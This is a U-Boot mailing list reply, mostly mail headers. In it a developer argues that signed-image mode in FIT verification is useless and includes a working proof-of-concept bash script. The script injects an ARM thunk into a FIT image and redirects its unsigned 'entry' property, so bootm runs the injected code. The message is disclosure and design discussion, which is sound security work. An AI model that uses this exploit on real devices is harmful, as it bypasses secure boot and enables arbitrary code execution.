Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id E11F8F33A78
	for <u-boot@archiver.kernel.org>; Thu,  5 Mar 2026 14:49:05 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id 3BF978382A;
	Thu,  5 Mar 2026 15:49:04 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=pass (p=reject dis=none) header.from=prevas.dk
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=pass (1024-bit key; unprotected) header.d=prevas.dk header.i=@prevas.dk header.b="EpIRgluB";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id 46678839A8; Thu,  5 Mar 2026 15:49:02 +0100 (CET)
Received: from PA4PR04CU001.outbound.protection.outlook.com
 (mail-francecentralazlp170130007.outbound.protection.outlook.com
 [IPv6:2a01:111:f403:c20a::7])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id B7FA381E18
 for <u-boot@lists.denx.de>; Thu,  5 Mar 2026 15:48:59 +0100 (CET)
Authentication-Results: phobos.denx.de;
 dmarc=pass (p=reject dis=none) header.from=prevas.dk
Authentication-Results: phobos.denx.de;
 spf=pass smtp.mailfrom=rasmus.villemoes@prevas.dk
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=awS/aOPEGPMlWbBxay3daSHr73YIggVpYlc9juopAGjmHnXTSbHCjCtYKGHaL1g4pqSwsJ4zBtNEGl5pOKaClAMObnQpX/UmQsr3sBHkzg7Dr2jDW1JSkwpn6QHHDf0AsiCFzGmiWIk63qWpSjhfX3GStTfZ6QMCrMhiJte3G+2JfrdM0k00Rs9Ud1vh0d2U5tpsgOh8yyshmUnT2PF925/9jdiLemPXjr0jn1l9q+NmlxmjN1BvIU3PHPqCHdqs+GfMJh5Y+0iHVG+dz/wmgbUJyd+MvolSI49c5KsEhQnDjF6q5JE4HMuVjf33/kOIDx15OuXwq9M5e9KpwFOUhg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=OgIQItEay9arG/KyFQPDvU6L7gXnl7+aqmazipUBync=;
 b=Vfuue2TfzwkZISK8BRh0o0pDFa5gogfULTbZccdHkeNStsY2YDZqDd44brnw/UYZZXAEL8glvYZt4tWMRhOuGqoGnaOgipxRDzrtx54d84wlKJwnBs4ylMIAYEHnkjdmJmB+trtc+/bFgPODXJhUlUuG2m4+HW5yJ+KuYIdmaUs45sRnf+C+VzJuP7Dundq4TKa9pu+FusBzMLTKmwhAjrg50QTwiXMf7tBwL69JN1OoVvuPxgQhXRTKh5dQC1u6wjR+oCO47JsrfFTCwbuUiJrq5Ev/U1lfi5/CfmXZsqeb6KC1Ztr1BYxW83Rc206aXQv5WD++DUU4me9Tv7XM/A==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=prevas.dk; dmarc=pass action=none header.from=prevas.dk;
 dkim=pass header.d=prevas.dk; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=prevas.dk; s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=OgIQItEay9arG/KyFQPDvU6L7gXnl7+aqmazipUBync=;
 b=EpIRgluB7u14oVAtmmnIy7HU2XmBm+UdXWz4w9LAkPJ7Xh6DFp6SwpRT4BeMtqFQespVzBCbE8+zWHaeLQuS2h+3Ee0/Sgw1vDdbUJ5FpdzwebW5NJAONeYespshDMKjINleySVpah7n+9KpiY+xdT5pPX5XKV+JdSaZN3WzC58=
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=prevas.dk;
Received: from AS5PR10MB8243.EURPRD10.PROD.OUTLOOK.COM (2603:10a6:20b:681::18)
 by VI1PR10MB3536.EURPRD10.PROD.OUTLOOK.COM (2603:10a6:800:134::10)
 with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9678.18; Thu, 5 Mar
 2026 14:48:55 +0000
Received: from AS5PR10MB8243.EURPRD10.PROD.OUTLOOK.COM
 ([fe80::ebc6:4e0d:5d6b:95d8]) by AS5PR10MB8243.EURPRD10.PROD.OUTLOOK.COM
 ([fe80::ebc6:4e0d:5d6b:95d8%5]) with mapi id 15.20.9678.017; Thu, 5 Mar 2026
 14:48:55 +0000
From: Rasmus Villemoes <ravi@prevas.dk>
To: Tom Rini <trini@konsulko.com>
Cc: u-boot@lists.denx.de
Subject: Re: [PATCH] FIT: Address Secure Boot Bypass for Signed FIT Images
In-Reply-To: <20260302220937.3682128-1-trini@konsulko.com> (Tom Rini's message
 of "Mon, 2 Mar 2026 16:09:37 -0600")
References: <20260302220937.3682128-1-trini@konsulko.com>
Date: Thu, 05 Mar 2026 15:48:52 +0100
Message-ID: <87h5quqqln.fsf@prevas.dk>
User-Agent: Gnus/5.13 (Gnus v5.13)
Content-Type: text/plain
X-ClientProxiedBy: MM0P280CA0058.SWEP280.PROD.OUTLOOK.COM
 (2603:10a6:190:b::25) To AS5PR10MB8243.EURPRD10.PROD.OUTLOOK.COM
 (2603:10a6:20b:681::18)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: AS5PR10MB8243:EE_|VI1PR10MB3536:EE_
X-MS-Office365-Filtering-Correlation-Id: 7af73d4c-2054-4283-f3a9-08de7ac65305
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
 ARA:13230040|1800799024|52116014|366016|376014|7053199007|38350700014; 
X-Microsoft-Antispam-Message-Info: rnkc+Bk2UyfkLYSxGn4+AxasAOgTQtdGz+Ii8m28hLUkXIUaLDkCtF0T0Zn89Zyf+C417ONaGhVD85TlZyDnnHJP/p/KM4ASCFCVXzhmvaffB06gfM1RoAB0yUvadSzyh3PUy6iBF8x6IOzq9+RgCt6O9TkHelpy17fPWd59jW57yEUVXKaTzygHJyxLYapbanMwP8HKqevKcRYKA177qoi6jAyOBnXVR6DeZ5ZgjcRJooKTxahtmlGXFGVAk5h0xzikPWLckWvo1r7pmFW9vKQMRs3zf2gtGLys8j5LCKEn/siEjjBqUHelV4qy4Iyyt8gMYirpsWwT70vzucqvTQaV+SQG+bsZDiMjq7cL7MfYntYg6xrgPo7kTT12FFNLxRjI1XJ/SiNljqX1E1ImJdRNZMkHL2/KIofG+dhB4GcZ4jLsPehAZU6GfU+1FU4GN7oAh9ydkOd6qwGOh9bld/SkXTdU4RUNC5fWewYr2GgB+b/OLEK1fVXig9GLLNeKM6tVbAOvtFkzz38aS/XBdZqOTjTuAy16KCJsD/yNta9G1Hx1yjew5EcN1Sn7oSkCpQKJMW3hvRZm2F4z2Zbk25uoLV+93B6DudA9cyPQpw4EDYeybtBJ2oxALNNF9gWfyYjB9+7c28bT6VGUjjNAJWB9SgN+er5OCAjdlDKuRgU2TGDCbKPaAnOlqQdXxbOor8QWBU1ey+9dk1PDf7NbC04XF7pOsvbI929vkNA+ZA+U4LTCXmo7wQ515y5s49p25vTHFYRE7tRZKwLUc+jZldkh9nI5/BHnG9biaI2YlgM=
X-Forefront-Antispam-Report: CIP:255.255.255.255; CTRY:; LANG:en; SCL:1; SRV:;
 IPV:NLI; SFV:NSPM; H:AS5PR10MB8243.EURPRD10.PROD.OUTLOOK.COM; PTR:; CAT:NONE;
 SFS:(13230040)(1800799024)(52116014)(366016)(376014)(7053199007)(38350700014);
 DIR:OUT; SFP:1101; 
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?us-ascii?Q?q+QsCsAtSY+Q1Eg9VpA7F/Dln7uyrELdJ643OHloe1MkLc1mXo2NbgSIIsvi?=
 =?us-ascii?Q?MlzcINW1xxMv6389mLZaY1CeEUs4sca1oVar0SzNyE7ZiAzHFi4TbODzJ+OM?=
 =?us-ascii?Q?TaekuAXBtA4lFw8gm/Ewn3Dybidvx3dcUVnWLcgPZUj7YFNtMgF1N5tXA7ea?=
 =?us-ascii?Q?x09omRM8YK+7jLiwnfnN9XY1O0NcWBGoM/8/H8K5Bqq56tC1ps+qz2AEVwXb?=
 =?us-ascii?Q?WUW16jnIL2eW/kdTmhS6TKXmDbVN+NRIbJ8WhW0oM+fE7Uikk/fzcHYrPf1F?=
 =?us-ascii?Q?xgUnVNSA05O1PUXquW2/LMW/A6/97opcrBNGrdDSjej5jQ5dHxjVlvrwtW44?=
 =?us-ascii?Q?qXN7U42m1bQs/mNkoQmvq3eB00M+4laaz2wAX01njCE7Gk68qXWWxj/5FdbZ?=
 =?us-ascii?Q?l+4vt5I123EqM6TH/hwV8cRW0XhJGSShITzxnP+mBmHOsd+A11Vj3/8ugz7t?=
 =?us-ascii?Q?6CW/xGu57lgrcQvVfuXjgUCdjqA5WC/bTD22FUXUISmSoKCsBgRKAT08PwR6?=
 =?us-ascii?Q?ZkpUB9T5/Ve3viXTrBglt09VkKOsl+FhAJ+NUnsYdvjzr0V1CTmMx/LCvO9L?=
 =?us-ascii?Q?QBIp6OJYni6+5d4TYKN0YWoeO6rtlW0jhZVLLo9IfBnO8IQBBb5/cyhjdm5S?=
 =?us-ascii?Q?2iadASiXaJypFbZQzf4K+YHMXJc5/ppIUeyyfvELrgwTU4leWLYvSr87r44f?=
 =?us-ascii?Q?EEjiwLpf8bAHP2TNFFDGhX255sft9z/ZbVLYc3rbCIiEqTrjlh1Wanen2x6W?=
 =?us-ascii?Q?bnK24D15sX/0z6Etg2ZKIs2aQzbWs/C4ClZtApJVf4ZoeS81qc1Wb+j5rDzQ?=
 =?us-ascii?Q?hEYoS4rm1edMMaX+hT18k5zweneEZGM5uKFfaip0z3id+rIQkcar9+oveEXY?=
 =?us-ascii?Q?ZcAUlk5y9Eu5xyoc9PY9CJ/0chMr/iGJxDZhlEyrQ9TisQ8BcqSxcNdTdv+Q?=
 =?us-ascii?Q?OLbpzbupDz3PWPRWvnaNSsPUYeeCeCf2IIqfa0H4dlft7lCkXgeHZHMWC65a?=
 =?us-ascii?Q?+w3lvLNPHJx0sPUWdwBz1W++aClA/cHI6vKm/MhBx3+vhr5aAIdPCO6STQ9p?=
 =?us-ascii?Q?6lzMT9qEigITim9xVJvPBrWCVTPJUqhzkCbWtWH30+O/FS94V65/fsnfY42m?=
 =?us-ascii?Q?04eycqzqBUpuweC9jmlfuU31qo93KI9p1lq5Mzik1KCtVjxtRbofrAnxSp1d?=
 =?us-ascii?Q?3DZb10dNFt9uX/uVyobz4IakjM8LiJSSb0Deffa2yAiZaRqKr4rR2njVKPB9?=
 =?us-ascii?Q?Pbnk/KsJeSkRrUJ0P/lgnBzbSIKp2iwGtmG/2gyXcM8pUhqMwbVZDMu+M17j?=
 =?us-ascii?Q?BoHYKuKOCSN9PVBrLXTIfI/JXVwSQDVb0ch/cQMthBS/cKrNIht3sURize0+?=
 =?us-ascii?Q?FVikg1ATQxKyGxBwc9uAJk6XHflm0p3xbhgZWbGAZMRTlpHCPzKUJIPdODHc?=
 =?us-ascii?Q?hd8RfJC8zEk9zZn/mPTouF+fT4lXtm/AnxN1dk2WpC1IaHR1CgorgQ0uZvYC?=
 =?us-ascii?Q?8Tv/hJb4oihX7vfs7IqSZtqnu7w8F9yuUvVbe5wobJoRoIgIgU2oxZgmafDv?=
 =?us-ascii?Q?rgebRv15z7PGst6xM++vuUfOpt76GA8DLaIClc/VHWTIJyjN/7oF4SObGbw1?=
 =?us-ascii?Q?qxQMWa+H69fQ5V+M6srE8BCwNZL8V5OLAicg6ne+esYjb/vUOm4yM2bPFHHW?=
 =?us-ascii?Q?I99khNa9oFF2QrwBe4iX6RxsZWnT+eLfHiv8RGkSjGugWyrfx+zp908VJkoS?=
 =?us-ascii?Q?zIQ3pELFpCoU3d0EC5LEKLb+OUaXRLc=3D?=
X-OriginatorOrg: prevas.dk
X-MS-Exchange-CrossTenant-Network-Message-Id: 7af73d4c-2054-4283-f3a9-08de7ac65305
X-MS-Exchange-CrossTenant-AuthSource: AS5PR10MB8243.EURPRD10.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 05 Mar 2026 14:48:54.9659 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: d350cf71-778d-4780-88f5-071a4cb1ed61
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: th5QmLPiL6DKBtOqW5fS5HaXR/0xg9PdGfmhFijvitPNifKzTisYvXKn6sNRJvw5wIWWkjA8+ycm2lMCfY3ek6cbsp6p5SG5NIEu+CO+AIA=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: VI1PR10MB3536
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean

On Mon, Mar 02 2026, Tom Rini <trini@konsulko.com> wrote:

> There is a flaw in how U-Boot verifies and generates signatures for FIT
> images. To prevent mix and match style attacks, it is recommended to
> use signed configurations. How this is supposed to work is documented in
> doc/usage/fit/signature.rst.

So the issue at hand is of course bad enough.

But can we please stop pretending that "mix and match" attacks are a
problem with the reguired=image mode, at least compared to the giant
hole which is that the 'entry' property can be modified arbitrarily [1],
including to point at a payload injected to the FIT image itself?

IMO, we should nuke all the code which deals with the required=image
mode and make it a build-time error to have such a key in the control
dtb, it offers no protection at all, and by having all the verification
logic duplicated in _image and _conf versions, it just makes it harder
to spot problems with the verification code in general.

[1] I just did a POC on a beagleboneblack. Add a

int poc_func(int arg) { printf("Got %x news ...\n"); }

function to the U-Boot source code, add a dummy call poc_func(0)
somewhere so it doesn't get gc'ed, then use something like this to
modify a FIT image with signed image nodes. bootm will happily accept
it, and jump to the thunk embedded in the FIT, which in turn will (for
demonstration) call that poc_func and you'll see "Got bad news ..."
printed.

===
#!/bin/bash

FIT_IMAGE=kernel.itb
FIT_KERNEL_PATH=/images/kernel-1
FIT_LOAD_ADDR=0x82000000

# This is only needed because we want to call back into U-Boot for
# demonstration, in practice one would make the payload
# self-contained.
RELOC_OFFSET=0x1f76d000

# Find the address of poc_func function
build_addr=$(nm ../u-boot | grep -w poc_func | awk '{print $1}')

printf -v addr '%08x' $((0x${build_addr} + ${RELOC_OFFSET}))
echo "poc_func post-relocation address: ${addr}"

{
    # movw    r0, #2989       @ 0xbad
    printf '%b' '\x40\xf6\xad\x30'
    # ldr     r3, [pc, #0]
    printf '%b' '\x00\x4b'
    # bx      r3
    printf '%b' '\x18\x47'
    # The constant loaded above
    printf '%b' "\x${addr:6:2}\x${addr:4:2}\x${addr:2:2}\x${addr:0:2}"
    # Add a marker that will help us locate the byte offset in the FIT image of the thunk.
    printf '##exploit code##'
} > code.bin

fdtput -t bx -p "${FIT_IMAGE}" / poc $(xxd -i < code.bin | tr -d ,)
offset=$(grep -a -o --byte-offset '##exploit code##' "${FIT_IMAGE}" | cut -f1 -d:)

# Change the 'entry' property of the kernel image so that it points to the start of our
# payload. That is 12 bytes long, so subtract 11 (because thumb
# mode...). Adjust as necessary.
fdtput -t u "${FIT_IMAGE}" "${FIT_KERNEL_PATH}" entry $((FIT_LOAD_ADDR + offset - 11))

===

Adding a sanity check that 'entry' points somewhere within [$load,
$load+size] could make this harder, but is not enough; there are likely
to be byte sequences in the kernel image that decode as some useful jump
instruction.

Rasmus
